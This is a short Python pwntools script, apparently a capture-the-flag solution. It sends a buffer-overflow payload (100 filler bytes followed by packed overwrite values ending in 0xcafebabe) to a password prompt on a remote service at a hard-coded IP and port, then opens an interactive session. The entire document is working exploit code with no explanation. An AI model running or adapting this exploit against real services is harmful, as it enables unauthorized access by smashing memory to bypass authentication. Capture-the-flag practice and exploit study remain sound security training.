from pwn import *
payload = "A"*100+"\xff\xff\x00\x00"+"\xee\xee\x00\x00"+"\xdd\xdd\x00\x00"+"\xcc\xcc\x00\x00"+"\xbb\xbb\x00\x00"+"\xaa\xaa\x00\x00"+"\xbe\xba\xfe\xca"

p = remote('35.240.148.138', 5002)
print(p.recvuntil('Enter password:'))
print(p.recvline())
p.sendline(payload)
print(p.recvline())
p.interactive()
